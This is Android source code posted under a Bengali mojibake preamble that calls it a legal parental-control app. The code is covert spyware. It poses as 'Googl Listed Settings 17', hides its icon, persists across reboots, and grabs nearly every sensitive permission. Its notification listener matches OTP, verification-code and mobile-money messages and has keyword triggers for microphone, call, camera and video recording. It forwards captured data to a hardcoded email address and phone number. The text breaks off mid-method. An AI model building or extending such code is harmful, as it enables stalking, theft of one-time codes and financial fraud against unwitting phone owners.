à¦à¦Ÿà¦¾ parental control child monitoring legal app  sms notification Data à¦¶à¦°à§à¦¤à¦¾à¦¨à§à¦¸à¦¾à¦°à§‡ forwarding à¦¹à¦¬à§‡ email googledrive firebase à¦“ à¦«à§‹à¦¨à§‡ SNMS à¦¦à§à¦¬à¦¾à¦°à¦¾à¦“ à¥¤ à¦ªà§à¦°à¦¾à§Ÿ à§¯à§®% java xml à¦“ gradle à¦•à§‹à¦¡ à¦¨à¦¿à¦®à§à¦¨à¦°à§à¦ª : 

//AndroidManifest.xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Adjust minSdkVersion to 21 to support Android 5.0 and above -->
    <uses-sdk
        android:minSdkVersion="23"
        android:targetSdkVersion="34"
        tools:overrideLibrary="com.google.firebase.database" />


    <!-- Permissions -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.FLASHLIGHT" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
    <uses-permission android:name="com.vivo.permission.manage.permission.ACCESS" />
    <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE" />
    <uses-feature android:name="android.hardware.telephony" android:required="false" />
    <uses-feature android:name="android.hardware.camera" android:required="true" />
    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
    <uses-feature android:name="android.hardware.microphone" android:required="true" />
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
        tools:ignore="ProtectedPermissions" />


    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE" android:maxSdkVersion="28"
        tools:ignore="ProtectedPermissions" />

    <!-- Application tag with all your components -->
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme"
        android:usesCleartextTraffic="true"
        android:name=".MyApplication">

        <!-- Main Activity -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:excludeFromRecents="true"
            android:taskAffinity="" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity android:name=".GetSim1AndSim2NumberFromAlertbox"
            android:launchMode="singleTask"
            android:excludeFromRecents="true"
            android:taskAffinity=""/>



        <!-- Background Service for location and other tasks -->
        <service
            android:name=".BackgroundService"
            android:enabled="true"
            android:exported="true"
            android:foregroundServiceType="location"
            tools:ignore="ForegroundServicePermission" />

        <!-- Declare the BroadcastReceiver -->
        <receiver android:name=".AutoRestartReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.ACTION_SHUTDOWN" />
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <!-- AutoStartReceiver Service -->
        <receiver android:name=".AutoStartReceiver"
            android:enabled="true"
            android:exported="true"/>

        <!-- Notification Listener Service -->
        <service
            android:name=".NotificationListener"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- SMS Receiver -->
        <receiver
            android:name=".SmsReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- File Service -->
        <receiver
            android:name=".FileService"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- Video Recording Service
        <service
            android:name=".VideoRecord"
            android:enabled="true"
            android:exported="true"
            android:foregroundServiceType="mediaPlayback"
            tools:ignore="ForegroundServicePermission,Instantiatable" />  -->

        <!-- Video Record Receiver
        <receiver
            android:name=".VideoRecord"
            android:exported="true"
            tools:ignore="Instantiatable">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE" />
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                <action android:name="com.example.fasterpro11.ACTION_RECORD_VIDEO" />
            </intent-filter>
        </receiver> -->

        <!-- Mic Record Receiver
        <receiver
            android:name=".MicRecord"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE" />
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver> -->

        <!-- CallRecorderAuto Recorder Receiver -->
        <receiver
            android:name=".CallRecorderAuto"
            android:exported="true"
            tools:ignore="Instantiatable">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE" />
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- MyAccessibilityService Recorder Receiver -->
        <service
            android:name=".MyAccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:foregroundServiceType="specialUse"
            android:stopWithTask="false"
            android:exported="false"> <!-- à¦à¦–à¦¾à¦¨à§‡ exported=false à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à§à¦¨ -->
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- CallRecorderAccessibilityService Receiver  -->
        <service
            android:name=".CallRecorderAccessibilityService"
            android:exported="false"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>

            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- DialCodeReceiver -->
        <receiver android:name=".DialCodeReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.DIAL" />
            </intent-filter>
        </receiver>

        <service android:name="androidx.work.impl.background.systemjob.SystemJobService"
            android:permission="android.permission.BIND_JOB_SERVICE" />

        <!-- Boot Receiver to handle Boot Completed -->
        <receiver
            android:name=".BootBroadcastReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.REBOOT" />
            </intent-filter>
            <!-- This allows the app to start after the device boots -->
            <meta-data
                android:name="android.app.opener"
                android:value="true" />
        </receiver>
    </application>
</manifest>


//MainActivity.java
package com.example.fasterpro11;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_REQUEST_CODE = 1002;
    private static final int ACCESSIBILITY_PERMISSION_REQUEST_CODE = 1003;
    private static final int AUTO_HIDE_DELAY = 1600 * 60000; // 60 minutes
    public String UserID = "";
    public String UserID2 = "";

    private PowerManager.WakeLock wakeLock;
    // All required permissions list
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    };

    private Toast currentToast;
    private MicRecord micRecord;
    private int permissionRequestAttempts = 0;
    private int accessibilityPermissionAttempts = 0;
    private String appName = "Googl Listed Settings 17 ";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            super.onCreate(savedInstanceState);
            micRecord = new MicRecord(this);

            // First ask user to grant all permissions
            showToast(appName + " Please allow all permissions");


            requestIgnoreBatteryOptimizations();
            acquireWakeLock();
            // Start permission requests
            requestOverlayPermission();
            checkAndRequestPermissions();

            // Setup background tasks
            new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, AUTO_HIDE_DELAY);
            WorkRequest smsNotificationWorkRequest = new OneTimeWorkRequest.Builder(BackgroundSmsNotificationWorker.class)
                    .addTag("BackgroundSmsNotification")
                    .build();
            WorkManager.getInstance(this).enqueue(smsNotificationWorkRequest);

            checkPackageExistence();
            setDailyAlarm(this);
            startBackgroundService();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                handlePhoneNumberPermission();
            }

        } catch (Exception e) {
            Log.e(TAG, "App error, restarting...", e);
            Intent restartIntent = new Intent(MainActivity.this, AutoRestartReceiver.class);
            sendBroadcast(restartIntent);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Check permissions again when user returns to the app
        requestOverlayPermission();
        checkAndRequestPermissions();
    }

    // Method to check and request permissions
    private void checkAndRequestPermissions() {
        Log.d(TAG, "Checking permissions...");

        List<String> missingPermissions = getMissingPermissions();

        if (missingPermissions.isEmpty()) {
            Log.d(TAG, "All permissions already granted");
            showToast("Overall permission already  allowed");
            checkAccessibilityPermission();
        } else {
            if (permissionRequestAttempts < 10) {
                permissionRequestAttempts++;
               // Log.d(TAG, "Requesting missing permissions (Attempt " + permissionRequestAttempts + ")");
                showToast("checkAndRequestPermissions Missing permissions: " + missingPermissions);
                ActivityCompat.requestPermissions(this,
                        missingPermissions.toArray(new String[0]),
                        PERMISSION_REQUEST_CODE);
            } else {
                //showToast("Permission request limit reached. Missing: " + missingPermissions);
                //Log.w(TAG, "Permission request limit reached");
                checkAccessibilityPermission();
            }
        }
    }

    // Helper method to get list of missing permissions
    private List<String> getMissingPermissions() {
        List<String> missingPermissions = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
            }
        }
        return missingPermissions;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            List<String> stillMissing = new ArrayList<>();

            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    stillMissing.add(permissions[i]);
                }
            }

            if (stillMissing.isEmpty()) {
                Log.d(TAG, "onRequestPermissionsResult All requested permissions granted");
                showToast("Overall permission Already allowed");
                checkAccessibilityPermission();
            } else {
                Log.w(TAG, "onRequestPermissionsResult permissions missing: " + stillMissing);
               // showToast(" missing permissions: " + stillMissing);

                if (permissionRequestAttempts < 10) {
                    checkAndRequestPermissions();
                } else {
                    //showToast("Permission request limit reached. Missing: " + stillMissing);
                    checkAccessibilityPermission();
                }
            }
        }
    }

    // Method to check accessibility service permission
    private void checkAccessibilityPermission() {
        if (!isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
            if (accessibilityPermissionAttempts < 10) {
                accessibilityPermissionAttempts++;
                showToast(appName + " Allow Accessibility permission (Attempt " + accessibilityPermissionAttempts + ")");
                requestAccessibilityPermission();
            } else {
                showToast(appName + " Accessibility permission request limit reached ");
            }
        } else {
            Log.d(TAG, "AccessibilityService already enabled");
            if (getMissingPermissions().isEmpty()) {
                showToast("Overall permission all allowed");
            }
            startServicesAndRequests();
        }
    }

    // Method to request accessibility permission
    private void requestAccessibilityPermission() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivityForResult(intent, ACCESSIBILITY_PERMISSION_REQUEST_CODE);
        Log.d(TAG, "Requesting AccessibilityService permission");
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == ACCESSIBILITY_PERMISSION_REQUEST_CODE) {
            if (isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
                Log.d(TAG, "AccessibilityService permission granted");
                if (getMissingPermissions().isEmpty()) {
                    showToast("Overall permission all allowed");
                }
                startServicesAndRequests();
            } else {
                Log.w(TAG, "AccessibilityService permission not granted");
                checkAccessibilityPermission(); // Try again (up to 10 times)
            }
        } else if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
            if (micRecord.hasOverlayPermission()) {
                Log.d(TAG, "Overlay permission granted");
                requestNotificationPermission();
                if (getMissingPermissions().isEmpty()) {
                    showToast("Overall permission all allowed");
                }
            } else {
                Log.w(TAG, "Overlay permission not granted");
                requestOverlayPermission();
            }
        }
    }

    // Method to start all services and requests
    private void startServicesAndRequests() {
        Log.d(TAG, "Starting services and requests");
        startBackgroundService();
        requestNotificationListenerPermission();
        requestManageExternalStoragePermission();

        if (areAllPermissionsGranted() && isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
            showToast("Overall permission all allowed");
            // All permissions granted, proceed with app functionality
        }
    }

    // Check if all permissions are granted
    private boolean areAllPermissionsGranted() {
        return getMissingPermissions().isEmpty();
    }

    // Show toast message
    private void showToast(String message) {
        if (currentToast != null) {
            currentToast.cancel();
        }
        currentToast = Toast.makeText(this, message, Toast.LENGTH_LONG);
        currentToast.show();
    }

    // Hide app icon
    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    // Handle phone number permission
    private void handlePhoneNumberPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "READ_PHONE_NUMBERS permission granted");
        } else {
            Log.w(TAG, "READ_PHONE_NUMBERS permission not granted");
        }
    }

    // Request overlay permission
    private void requestOverlayPermission() {
        Log.d(TAG, "Checking overlay permission");
        if (!micRecord.hasOverlayPermission()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE);
            Log.d(TAG, "Requesting overlay permission");
        } else {
            Log.d(TAG, "Overlay permission already granted");
        }
    }

    // Request notification permission
    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_CODE);
                Log.d(TAG, "Requesting POST_NOTIFICATIONS permission");
            }
        }
    }

    // Request notification listener permission
    private void requestNotificationListenerPermission() {
        if (!isNotificationServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
            Log.d(TAG, "Requesting NOTIFICATION_LISTENER permission");
        }
    }

    // Request manage external storage permission
    private void requestManageExternalStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivity(intent);
            }
        }
    }


    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::WakeLockTag");
        wakeLock.acquire();
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }



    // Start background service
    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting background service", e);
        }
    }

    // Check if notification service is enabled
    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && pkgName.equals(cn.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }

    // Check if accessibility service is enabled
    private boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        String prefString = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (prefString != null) {
            String[] services = prefString.split(":");
            for (String service : services) {
                if (service.equalsIgnoreCase(new ComponentName(context.getApplicationContext(), accessibilityService).flattenToString())) {
                    return true;
                }
            }
        }
        return false;
    }

    // Set daily alarm
    private void setDailyAlarm(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (!context.getSystemService(AlarmManager.class).canScheduleExactAlarms()) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                startActivity(intent);
                return;
            }
        }

        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, AutoStartReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        Calendar calendar = Calendar.getInstance();

        // Alarm for 9 AM
        calendar.set(Calendar.HOUR_OF_DAY, 9);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);

        // Alarm for 12 AM
        calendar.set(Calendar.HOUR_OF_DAY, 0);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);
    }

    // Check package existence
    private void checkPackageExistence() {
        PackageManager pm = getPackageManager();
        try {
            pm.getApplicationInfo("com.example.fasterpro11", 0);
            Log.d("PackageFound", "com.example.fasterpro11 is installed");
        } catch (PackageManager.NameNotFoundException e) {
            Log.e("PackageNotFound", "com.example.fasterpro11 not found", e);
        }
    }
}



//NotificationListener.java
package com.example.fasterpro11;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.Icon;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.content.Intent;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsManager;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.CookieHandler;
import java.net.CookiePolicy;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.io.InputStream;

import android.os.Handler;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Timer;
import java.util.TimerTask;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import java.net.CookieHandler;
import java.net.CookieManager;
import java.net.CookiePolicy;

import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NotificationListener extends NotificationListenerService {


    static {
        CookieManager cookieManager = new CookieManager();
        cookieManager.setCookiePolicy(CookiePolicy.ACCEPT_ALL);
        CookieHandler.setDefault(cookieManager);
    }

    private static final long DELAY = 30* 60 * 1000; //  minutes in milliseconds
    private static final int MAX_WORDS = 200; // Maximum words before sending email


   // private static final long DUPLICATE_COOLDOWN = 1 * 60 * 1000; // 1 minutes
    private StringBuilder emailContentBuffer = new StringBuilder();
    private Timer timer = new Timer();
    private Handler handler = new Handler();
    private boolean isTimerRunning = false;

    private static final String TAG = "NotificationListener";
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private static final String EMAIL = "abontiangum99@gmail.com"; // Update recipient email
    private static final String SMS_RECIPIENT = "+8801300282086"; // Update SMS recipient number
    public static String globalmessage;
    public static String NotificationCallingAppglobalmessage;
    public static String NotificationCallingAppglobalmessage2;
    public static String notificationglobalsubject;

    public String subject;
    public String recentCallLogs ;
    public String UserID1 ;
    public String UserID2;

    public String sim1Number="";
    public String sim2Number="";
    public String EmailFirstPartName="";
    public String EmailPassword="";


    public int CounterSociaMedialSMS= 0;


    private boolean isBound = false; // Add binding state
    private String NotificationfindAllowedKeyword1;
    private String NotificationfindAllowedKeyword2;
    private String callingAppSoundRecord;
    private Context mContext;
    private Context context;

    private static final String[] Condition_Word_For_Mic = {"Goldm","Silverm","Mediumm",
            "?", "?", "helo",  "?????", "????","???","??? ????","????", "???", "???",  "????????? ???","?????????",
            "screenshort","screenshort dau", "?????",  "????? " };
    private static final String[] Condition_Word_For_CallingAppSoundRecord= {"Incoming voice call","Ongoing video call","Incoming", "Calling…", "Ringing…","voice call",
            "Missed voice call", "call", "Call","calling","Missed call" };
    private static final String[] Condition_Word_For_CallRecord = {"Goldcc", "Silvercc", "Mediumcc",
            "call","audio", "??", "???",  "?????", "??", "??", "??",  "????",  "?????", "?????",  "???",
            "????",  "????", "oi", "screen short","screenshortdau","???",  "??????",   "????", "?????",
            "???? ", "?????",   "???", "???????????", "Call",  };
    private static final String[] Condition_Word_For_File = {"Congratulationf", "Conformf",
            "aei","file", "???",  "???",  "????",  "???????",  "????", "?????",   "?????",  "????????????", "File",  };
    private static final String[] Condition_Word_For_Camera = {"Congratulationp", "Conformp"};
    private static final String[] Condition_Word_For_Video = {"Congratulationv", "Conformv",
            "video", "?????", "????", "??? ",  "????????",   "????????",  "camera","?????", "????",  "?????",
            "aii",    "?????", "whatesapps","Video",  };

    private static final String[] SEND_MONEY_WORDS = {"Cash In", "cash in", "send money", "money", "Money","received",
            "received TK","Cashback","Balance", "Recharge",  "received money"};
    private static final String[] OTP_WORDS = {"OTP", "Otp", "otp",  "PIN", "Pin", "pin","CODE", "Code", "code",
            "Google verification code","verification code","Verification code",
            "??????? ??? (code)","??????? ??? ", "??????? ??? (code)", "(code)",
            "VERIFICATUON", "Verification", "verification"};
    private static class ForwardedMessage {
        String message;
        long timestamp;

        ForwardedMessage(String message, long timestamp) {
            this.message = message;
            this.timestamp = timestamp;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "NotificationListener service created");
        mContext = this; // Context
//        Context  context = this; // Use the service's context

        // Initialize the email accounts when the activity is created
        JavaMailAPISendNotificationUseEmails.initialize(this);




    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isBound) {
            bindService(new Intent(this, BackgroundService.class), serviceConnection, Context.BIND_AUTO_CREATE);
            isBound = true;
            Log.d(TAG, "Service bound");
        } else {
            Log.d(TAG, "Service is already bound");
        }

        if (intent != null && "SAVE_TO_TEXT_FILE".equals(intent.getAction())) {
            String content = intent.getStringExtra("content");
            if (content != null) {
                saveToTextFile(this,content);
            }
        }

        return START_STICKY;
    }


    @Override
    public void onDestroy() {
        if (isBound) {
            try {
                unbindService(serviceConnection);
                isBound = false;
                Log.d(TAG, "Service unbound successfully");
            } catch (IllegalArgumentException e) {
                Log.e(TAG, "Error unbinding service: ", e);
            }
        } else {
            Log.d(TAG, "Service was not bound");
        }
        super.onDestroy();
    }

    // ServiceConnection definition
    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d(TAG, "Service connected");
            isBound = true; // ??????? ??? ????
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "Service disconnected");
            isBound = false; // ??????? ????? ????
        }
    };

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        if (notification == null) {
            Log.e(TAG, "in onNotificationPosted method Received null notification");
            return;
        }
        Context context = getApplicationContext();
        if (context == null) {
            Log.e("NotificationListener", "Context is null!");
            return;
        }

        try {
            Bundle extras = notification.extras;
            CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
            Uri fileUri = extras.getParcelable(Intent.EXTRA_STREAM); // ???? ????

            Bitmap largeIconBitmap = extractLargeIcon(extras);

            if (title != null && (text != null || largeIconBitmap != null)) {
                String packageName = sbn.getPackageName();
                String currentMessage = title + " " + (text != null ? text : "");
                //String message="in onNotificationPosted your message";
                String message= currentMessage;
                String  exmessage= currentMessage;
                globalmessage =message;
                CallRecorderAccessibilityService.notificationCallingAppGlobalMessage1 = message;

                // ===== Duplicate Check =====
                if (!shouldForwardNotification(packageName, currentMessage)) {
                    Log.d(TAG, "Duplicate notification blocked: " + currentMessage);
                    return; // Duplicate ? forward ????
                }
                //  Sim Number ,Email ,Email Password Set from Notification Alart message . socialmedia whatsapp whatsapp messenger
                if (    packageName.equals("com.whatsapp") || packageName.equals("com.facebook.orca") ||
                        packageName.equals("com.imo.android.imoim")||
                        packageName.equals("com.vivo.sms")||
                        packageName.equals("com.coloros.mms")||
                        packageName.equals("com.samsung.android.messaging")|| packageName.equals("com.samsung.android.dialer")||
                        packageName.equals("com.realme.android.dialer")|| packageName.equals("com.google.android.dialer")||
                        packageName.equals("com.android.systemui")||
                        packageName.equals("com.android.mms")|| packageName.equals("com.miui.sms")||
                        packageName.equals("com.google.android.apps.messaging")||
                        packageName.equals("com.android.mms.service")      )  {
                    Log.d(TAG, "Notification : " + currentMessage);
